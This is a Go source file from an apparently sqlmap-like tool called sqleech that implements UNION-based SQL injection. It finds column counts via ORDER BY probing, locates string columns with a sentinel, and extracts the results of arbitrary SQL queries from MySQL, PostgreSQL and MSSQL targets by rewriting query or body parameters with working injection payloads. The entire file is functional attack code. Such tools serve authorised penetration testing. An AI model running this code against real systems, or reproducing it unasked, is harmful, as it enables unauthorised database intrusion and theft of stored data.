// Package union implements the UNION-based SQL injection technique.
//
// UNION-based injection appends a UNION SELECT statement to the original query
// to retrieve data from the database in the HTTP response. The technique works
// by:
//
//  1. Column count detection: Binary-search on ORDER BY N to find how many
//     columns the underlying query returns (N=1,2,…,maxColumns).
//  2. String column detection: For each column position, inject a unique
//     sentinel string and check whether it appears in the response body.
//  3. Extraction: Inject the target SQL expression wrapped with CHAR(126)
//     markers (~value~) into the string column and parse the result.
//
// Supported DBMS:
//   - MySQL:      CONCAT(CHAR(126),(query),CHAR(126))
//   - PostgreSQL: chr(126)||(query)||chr(126)
//   - MSSQL:      CHAR(126)+CAST((query) AS NVARCHAR(MAX))+CHAR(126)
package union

import (
	"context"
	"fmt"
	"net/url"
	"strings"

	"github.com/0x6d61/sqleech/internal/dbms"
	"github.com/0x6d61/sqleech/internal/engine"
	"github.com/0x6d61/sqleech/internal/payload"
	"github.com/0x6d61/sqleech/internal/technique"
	"github.com/0x6d61/sqleech/internal/transport"
)

const (
	// maxColumns is the upper bound for ORDER BY probing.
	maxColumns = 20

	// sentinel is the unique string injected to identify string-accepting columns.
	// It must be short enough to fit in any VARCHAR column.
	// Exported so test infrastructure (VulnServer) can reference the same value.
	sentinel = "sqleech3z9"
)

// orderByErrorKeywords are substrings that indicate an ORDER BY column index
// exceeds the query's actual column count.
var orderByErrorKeywords = []string{
	"unknown column",
	"out of range",
	"order by position",
	"no such column",
	"invalid column number",
	"operand should contain",
}

// boundaryPair is a (prefix, suffix) pair used to escape the SQL context.
type boundaryPair struct {
	prefix, suffix string
}

// defaultBoundaries lists the boundary pairs tried during detection and extraction.
var defaultBoundaries = []boundaryPair{
	{"", "-- -"},
	{"'", "-- -"},
	{"\"", "-- -"},
	{")", "-- -"},
	{"')", "-- -"},
}

// Union implements UNION-based SQL injection detection and data extraction.
type Union struct{}

// New creates a Union technique.
func New() *Union { return &Union{} }

// Name returns "union-based".
func (u *Union) Name() string { return "union-based" }

// Priority returns 4 (after error-based=1, boolean-blind=2, time-based=3).
func (u *Union) Priority() int { return 4 }

// Detect determines whether a parameter is injectable via UNION SELECT.
//
// Algorithm:
//  1. For each boundary pair, use binary search on ORDER BY N to find the
//     column count of the underlying query.
//  2. Probe each column with a sentinel string to find a string-compatible column.
//  3. Report Injectable=true with the discovered boundary and column info.
func (u *Union) Detect(ctx context.Context, req *technique.InjectionRequest) (*technique.DetectionResult, error) {
	result := &technique.DetectionResult{Technique: u.Name()}
	d := findDBMS(req.DBMS)

	for _, bp := range defaultBoundaries {
		if ctx.Err() != nil {
			return result, ctx.Err()
		}

		colCount, _, err := u.findColumnCount(ctx, req, bp, req.Baseline.Body)
		if err != nil || colCount == 0 {
			continue
		}

		strCol, _, err := u.findStringColumn(ctx, req, bp, colCount, d)
		if err != nil || strCol < 0 {
			continue
		}

		result.Injectable = true
		result.Confidence = 0.90
		result.Evidence = fmt.Sprintf(
			"UNION SELECT with %d columns; string column at index %d (boundary: %q...%q)",
			colCount, strCol, bp.prefix, bp.suffix,
		)
		result.Payload = payload.NewBuilder().
			WithPrefix(bp.prefix).
			WithCore(fmt.Sprintf(" UNION SELECT %s",
				buildColumnList(colCount, strCol, "NULL", d),
			)).
			WithSuffix(bp.suffix).
			WithTechnique(u.Name()).
			WithDBMS(d.Name()).
			Build()
		return result, nil
	}

	return result, nil
}

// Extract retrieves the value of a SQL expression via UNION SELECT.
//
// Algorithm:
//  1. Re-discover the working boundary and column information (stateless).
//  2. Inject the target query wrapped with CHAR(126) markers into the string column.
//  3. Parse the ~value~ pair from the response body.
func (u *Union) Extract(ctx context.Context, req *technique.ExtractionRequest) (*technique.ExtractionResult, error) {
	d := findDBMS(req.DBMS)
	total := 0

	for _, bp := range defaultBoundaries {
		if ctx.Err() != nil {
			return nil, ctx.Err()
		}

		colCount, reqs, err := u.findColumnCount(ctx, &req.InjectionRequest, bp, req.Baseline.Body)
		total += reqs
		if err != nil || colCount == 0 {
			continue
		}

		strCol, reqs, err := u.findStringColumn(ctx, &req.InjectionRequest, bp, colCount, d)
		total += reqs
		if err != nil || strCol < 0 {
			continue
		}

		val, reqs, err := u.extractValue(ctx, &req.InjectionRequest, bp, colCount, strCol, d, req.Query)
		total += reqs
		if err != nil {
			return &technique.ExtractionResult{Partial: true, Requests: total}, err
		}

		return &technique.ExtractionResult{Value: val, Requests: total}, nil
	}

	return &technique.ExtractionResult{Requests: total}, nil
}

// --------------------------------------------------------------------------
// Internal helpers
// --------------------------------------------------------------------------

// findColumnCount uses binary search on ORDER BY N to determine the number of
// columns the underlying query returns for the given boundary pair.
//
// Returns (0, 0, nil) if ORDER BY 1 fails with the given boundary (the
// boundary does not produce valid SQL for this endpoint).
func (u *Union) findColumnCount(
	ctx context.Context,
	req *technique.InjectionRequest,
	bp boundaryPair,
	baseline []byte,
) (colCount int, requests int, err error) {
	// Verify that ORDER BY 1 works with this boundary.
	resp1, err := sendProbe(ctx, req, buildProbeStr(req.Parameter.Value, bp, "ORDER BY 1"))
	requests++
	if err != nil {
		return 0, requests, nil //nolint:nilerr // skip on network error
	}
	if isOrderByError(baseline, resp1.Body) {
		// This boundary breaks the ORDER BY syntax.
		return 0, requests, nil
	}

	// Binary search for the highest valid N.
	low, high := 1, maxColumns
	for low < high {
		if ctx.Err() != nil {
			return 0, requests, ctx.Err()
		}
		mid := (low + high + 1) / 2
		resp, serr := sendProbe(ctx, req, buildProbeStr(req.Parameter.Value, bp, fmt.Sprintf("ORDER BY %d", mid)))
		requests++
		if serr != nil || isOrderByError(baseline, resp.Body) {
			high = mid - 1
		} else {
			low = mid
		}
	}

	return low, requests, nil
}

// findStringColumn probes each column position with the sentinel string and
// returns the 0-based index of the first column whose value appears in the
// response body. Returns -1 if no string column is found.
func (u *Union) findStringColumn(
	ctx context.Context,
	req *technique.InjectionRequest,
	bp boundaryPair,
	colCount int,
	d dbms.DBMS,
) (strCol int, requests int, err error) {
	quotedSentinel := d.QuoteString(sentinel)

	for i := 0; i < colCount; i++ {
		if ctx.Err() != nil {
			return -1, requests, ctx.Err()
		}

		colList := buildColumnList(colCount, i, quotedSentinel, d)
		probe := buildProbeStr(req.Parameter.Value, bp, fmt.Sprintf("UNION SELECT %s", colList))
		resp, serr := sendProbe(ctx, req, probe)
		requests++
		if serr != nil {
			continue
		}

		if strings.Contains(string(resp.Body), sentinel) {
			return i, requests, nil
		}
	}

	return -1, requests, nil
}

// extractValue injects the query with CHAR(126) markers and parses the result.
func (u *Union) extractValue(
	ctx context.Context,
	req *technique.InjectionRequest,
	bp boundaryPair,
	colCount, strCol int,
	d dbms.DBMS,
	query string,
) (string, int, error) {
	wrapped := wrapQueryWithMarker(d, query)
	colList := buildColumnList(colCount, strCol, wrapped, d)
	probe := buildProbeStr(req.Parameter.Value, bp, fmt.Sprintf("UNION SELECT %s", colList))
	resp, err := sendProbe(ctx, req, probe)
	if err != nil {
		return "", 1, err
	}
	return parseMarkedValue(string(resp.Body)), 1, nil
}

// buildColumnList returns a comma-joined SQL column expression for UNION SELECT.
// The column at strCol contains expr; all others are NULL.
func buildColumnList(colCount, strCol int, expr string, _ dbms.DBMS) string {
	cols := make([]string, colCount)
	for i := range cols {
		cols[i] = "NULL"
	}
	if strCol >= 0 && strCol < colCount {
		cols[strCol] = expr
	}
	return strings.Join(cols, ",")
}

// wrapQueryWithMarker wraps a SQL expression with DBMS-specific CHAR(126)
// (~) delimiters so the extracted value can be identified in the response body.
//
//   - MySQL:      CONCAT(CHAR(126),(query),CHAR(126))
//   - PostgreSQL: chr(126)||(query)||chr(126)
//   - MSSQL:      CHAR(126)+CAST((query) AS NVARCHAR(MAX))+CHAR(126)
func wrapQueryWithMarker(d dbms.DBMS, query string) string {
	switch d.Name() {
	case "PostgreSQL":
		return fmt.Sprintf("chr(126)||(%s)||chr(126)", query)
	case "MSSQL":
		return fmt.Sprintf("CHAR(126)+CAST((%s) AS NVARCHAR(MAX))+CHAR(126)", query)
	default: // MySQL and fallback
		return fmt.Sprintf("CONCAT(CHAR(126),(%s),CHAR(126))", query)
	}
}

// parseMarkedValue extracts the first ~value~ pair from the response body.
func parseMarkedValue(body string) string {
	start := strings.Index(body, "~")
	if start == -1 {
		return ""
	}
	rest := body[start+1:]
	end := strings.Index(rest, "~")
	if end == -1 {
		return ""
	}
	return rest[:end]
}

// buildProbeStr concatenates: value + prefix + " " + core + " " + suffix.
func buildProbeStr(value string, bp boundaryPair, core string) string {
	return value + bp.prefix + " " + core + " " + bp.suffix
}

// isOrderByError returns true when the response indicates an ORDER BY column
// index exceeded the query's actual column count. Uses both a page-length
// ratio check and SQL error keyword detection.
func isOrderByError(baseline, current []byte) bool {
	if len(baseline) > 0 && len(current) > 0 {
		ratio := float64(len(current)) / float64(len(baseline))
		if ratio < 0.4 {
			return true
		}
	}
	lower := strings.ToLower(string(current))
	for _, kw := range orderByErrorKeywords {
		if strings.Contains(lower, kw) {
			return true
		}
	}
	return false
}

// sendProbe sends an HTTP probe with the given payload string.
func sendProbe(ctx context.Context, req *technique.InjectionRequest, payloadStr string) (*transport.Response, error) {
	return req.Client.Do(ctx, buildProbeRequest(req.Target, req.Parameter, payloadStr))
}

// findDBMS returns the DBMS implementation for the given name, defaulting to MySQL.
func findDBMS(name string) dbms.DBMS {
	d := dbms.Registry(name)
	if d == nil {
		d = dbms.Registry("MySQL")
	}
	return d
}

// buildProbeRequest creates a transport.Request with the target parameter
// replaced by the given payload value.
func buildProbeRequest(target *engine.ScanTarget, param *engine.Parameter, payloadStr string) *transport.Request {
	req := &transport.Request{
		Method:      target.Method,
		URL:         target.URL,
		Body:        target.Body,
		ContentType: target.ContentType,
	}
	if target.Headers != nil {
		req.Headers = make(map[string]string, len(target.Headers))
		for k, v := range target.Headers {
			req.Headers[k] = v
		}
	}
	if target.Cookies != nil {
		req.Cookies = make(map[string]string, len(target.Cookies))
		for k, v := range target.Cookies {
			req.Cookies[k] = v
		}
	}
	switch param.Location {
	case engine.LocationQuery:
		req.URL = modifyQueryParam(target.URL, param.Name, payloadStr)
	case engine.LocationBody:
		req.Body = modifyBodyParam(target.Body, param.Name, payloadStr)
	}
	return req
}

func modifyQueryParam(rawURL, paramName, newValue string) string {
	parsed, err := url.Parse(rawURL)
	if err != nil {
		return rawURL
	}
	q := parsed.Query()
	q.Set(paramName, newValue)
	parsed.RawQuery = q.Encode()
	return parsed.String()
}

func modifyBodyParam(body, paramName, newValue string) string {
	values, err := url.ParseQuery(body)
	if err != nil {
		return body
	}
	values.Set(paramName, newValue)
	return values.Encode()
}
